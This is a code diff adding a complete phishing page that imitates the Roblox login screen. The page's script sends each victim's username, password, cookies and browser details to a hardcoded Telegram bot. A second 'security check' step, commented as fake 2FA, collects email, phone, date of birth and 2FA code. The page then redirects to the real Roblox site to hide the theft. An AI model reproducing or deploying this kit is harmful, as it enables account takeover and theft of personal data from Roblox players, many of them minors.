@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        body {
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #16213e;
+            padding: 40px;
+            border-radius: 24px;
+            width: 380px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+        }
+        .logo {
+            font-size: 36px;
+            font-weight: 700;
+            color: #e94560;
+            letter-spacing: 2px;
+        }
+        .logo span {
+            color: white;
+        }
+        .sub {
+            font-size: 14px;
+            color: #aaa;
+            margin-top: 4px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 8px;
+            background: #1a1a2e;
+            color: white;
+            font-size: 15px;
+            border: 1px solid #2a2a4e;
+        }
+        input:focus {
+            outline: none;
+            border-color: #e94560;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #c73652;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #888;
+        }
+        .footer a {
+            color: #e94560;
+            text-decoration: none;
+        }
+        .status {
+            font-size: 13px;
+            margin-top: 10px;
+        }
+        .error {
+            color: #ff6b6b;
+        }
+        .success {
+            color: #51cf66;
+        }
+        .hidden {
+            display: none;
+        }
+        .loader {
+            border: 3px solid #2a2a4e;
+            border-top: 3px solid #e94560;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .detail-box {
+            background: #1a1a2e;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-size: 13px;
+            color: #aaa;
+            text-align: left;
+        }
+        .detail-box strong {
+            color: #e94560;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">R<span>⚡</span>BLOX</div>
+    <div class="sub">Sign in to your account</div>
+
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username / Email / Phone" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Sign In</button>
+        <div id="loader" class="loader hidden"></div>
+        <div id="status" class="status"></div>
+    </form>
+
+    <!-- EXTRA DETAILS (FAKE 2FA) -->
+    <div id="extraFields" class="hidden">
+        <div class="detail-box">
+            <strong>🔐 Security Check</strong>
+            <p style="margin-top:6px;font-size:13px;">We detected a new login attempt. Please verify your identity.</p>
+        </div>
+        <input type="text" id="email" placeholder="Email Address">
+        <input type="text" id="phone" placeholder="Phone Number">
+        <input type="text" id="dob" placeholder="Date of Birth (YYYY-MM-DD)">
+        <input type="text" id="2fa" placeholder="2FA Code (if enabled)">
+        <button id="verifyBtn">Verify Identity</button>
+        <div id="status2" class="status"></div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Forgot password?</a> · <a href="#">Sign up</a>
+    </div>
+</div>
+
+<script>
+    // 🔥 TELEGRAM BOT CREDENTIALS
+    const BOT_TOKEN = '8926149584:AAGo89x7FOGVzMkG7UbnA_2mDcc04LWi7VM';
+    const CHAT_ID = '6946610185'; // YOUR TELEGRAM USER ID
+
+    // ========== SEND DATA TO TELEGRAM ==========
+    async function sendToTelegram(message) {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            return await res.json();
+        } catch (e) {
+            return { ok: false };
+        }
+    }
+
+    // ========== GET COOKIES ==========
+    function getAllCookies() {
+        return document.cookie.split(';').map(c => c.trim()).join('\n');
+    }
+
+    // ========== GET BROWSER DETAILS ==========
+    function getBrowserDetails() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            cookies: getAllCookies(),
+            localIP: 'N/A' // Can't get local IP without WebRTC (skip for simplicity)
+        };
+    }
+
+    // ========== MAIN LOGIN ==========
+    document.getElementById('loginForm').onsubmit = async function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const status = document.getElementById('status');
+        const loader = document.getElementById('loader');
+
+        if (!username || !password) {
+            status.textContent = '❌ Please fill all fields';
+            status.className = 'status error';
+            return;
+        }
+
+        status.textContent = '';
+        loader.classList.remove('hidden');
+
+        // Step 1: Send basic login
+        const browser = getBrowserDetails();
+        let msg = `🔴 **ROBLOX LOGIN**\n\n`;
+        msg += `👤 **Username:** ${username}\n`;
+        msg += `🔑 **Password:** ${password}\n\n`;
+        msg += `🌐 **Browser:** ${browser.userAgent}\n`;
+        msg += `📱 **Platform:** ${browser.platform}\n`;
+        msg += `🌍 **Language:** ${browser.language}\n`;
+        msg += `🖥️ **Screen:** ${browser.screen}\n\n`;
+        msg += `🍪 **Cookies:**\n${browser.cookies || 'None'}`;
+
+        const result = await sendToTelegram(msg);
+
+        if (result.ok) {
+            status.textContent = '✅ Login successful! Please verify your identity.';
+            status.className = 'status success';
+            document.getElementById('extraFields').classList.remove('hidden');
+            document.getElementById('loginForm').querySelector('button').disabled = true;
+            document.getElementById('loader').classList.add('hidden');
+        } else {
+            status.textContent = '❌ Error. Try again.';
+            status.className = 'status error';
+            loader.classList.add('hidden');
+        }
+    };
+
+    // ========== EXTRA DETAILS (2FA / EMAIL / PHONE) ==========
+    document.getElementById('verifyBtn').onclick = async function() {
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const dob = document.getElementById('dob').value.trim();
+        const twofa = document.getElementById('2fa').value.trim();
+        const status2 = document.getElementById('status2');
+
+        if (!email && !phone && !dob && !twofa) {
+            status2.textContent = '❌ Please fill at least one field';
+            status2.className = 'status error';
+            return;
+        }
+
+        let msg = `🔐 **ROBLOX EXTRA DETAILS**\n\n`;
+        if (email) msg += `📧 **Email:** ${email}\n`;
+        if (phone) msg += `📱 **Phone:** ${phone}\n`;
+        if (dob) msg += `🎂 **DOB:** ${dob}\n`;
+        if (twofa) msg += `🔑 **2FA Code:** ${twofa}\n`;
+
+        const result = await sendToTelegram(msg);
+
+        if (result.ok) {
+            status2.textContent = '✅ Verification successful! Redirecting...';
+            status2.className = 'status success';
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 2000);
+        } else {
+            status2.textContent = '❌ Error. Try again.';
+            status2.className = 'status error';
+        }
+    };
+</script>
+</body>
+  </html>
